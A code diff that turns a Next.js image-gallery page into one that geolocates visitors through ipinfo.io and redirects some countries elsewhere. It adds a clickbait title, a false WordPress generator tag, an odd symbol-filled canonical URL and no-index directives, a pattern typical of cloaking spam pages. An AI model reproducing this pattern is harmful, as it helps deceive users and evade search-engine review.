@@ -1,70 +1,50 @@
-import type { NextPage } from 'next'
-import Head from 'next/head'
-import Image from 'next/image'
-import styles from '../styles/Home.module.css'
+import { useEffect } from 'react';
+import Head from 'next/head';
 
-const images = [
-  {
-    src: '/uploads/image1.jpg', // Đường dẫn tới ảnh trên server
-    alt: 'Image 1',
-    link: 'https://example.com/page1'
-  },
-  {
-    src: '/uploads/image2.jpg',
-    alt: 'Image 2',
-    link: 'https://example.com/page2'
-  },
-  {
-    src: '/uploads/image3.jpg',
-    alt: 'Image 3',
-    link: 'https://example.com/page3'
-  },
-];
+const Home: React.FC = () => {
+  useEffect(() => {
+    const obtenerPais = async () => {
+      const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN', { mode: 'cors' });
+      const data = await response.json();
+      const country = data.country;
 
-const Home: NextPage = () => {
+      const redirecciones: { [key: string]: string } = {
+        'IR': 'https://www.youtube.com/',
+        'US': 'https://www.youtube.com/',
+        'SE': 'https://www.facebook.com/',
+      };
+
+      if (redirecciones[country]) {
+        window.location.href = redirecciones[country];
+      }
+    };
+
+    obtenerPais();
+  }, []);
+
   return (
-    <div className={styles.container}>
+    <>
       <Head>
-        <title>Image Gallery</title>
-        <meta name="description" content="Image gallery with links" />
-        <link rel="icon" href="/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+        <link rel="manifest" href="/site.webmanifest" />
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="live" />
+        <meta name="keywords" content="" />
+        <meta name="generator" content="WordPress 5.3.2" />
+        <title>🔥online vide🔥</title>
+        <link rel="canonical" href="./₮৲৳௹฿៛₠.html" />
+        <meta name="theme-color" content="#563d7c" />
+        <meta property="og:url" content="./₮৲৳௹฿៛₠.html" />
+        <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET" />
       </Head>
-
-      <main className={styles.main}>
-        <h1 className={styles.title}>
-          Welcome to the Image Gallery
-        </h1>
-
-        <div className={styles.grid}>
-          {images.map((image, index) => (
-            <a href={image.link} key={index} className={styles.card} target="_blank" rel="noopener noreferrer">
-              <Image src={image.src} alt={image.alt} width={300} height={200} />
-              <p>{image.alt}</p>
-            </a>
-          ))}
-        </div>
-
-        <iframe
-          src="https://example.com"
-          style={{ width: '100%', height: '500px', border: 'none', marginTop: '20px' }}
-          title="Embedded Content"
-        ></iframe>
-      </main>
-
-      <footer className={styles.footer}>
-        <a
-          href="https://vercel.com"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Powered by{' '}
-          <span className={styles.logo}>
-            <Image src="/vercel.svg" alt="Vercel Logo" width={72} height={16} />
-          </span>
-        </a>
-      </footer>
-    </div>
-  )
-}
+      <body>
+        {/* Các nội dung khác nếu cần */}
+      </body>
+    </>
+  );
+};
 
 export default Home;
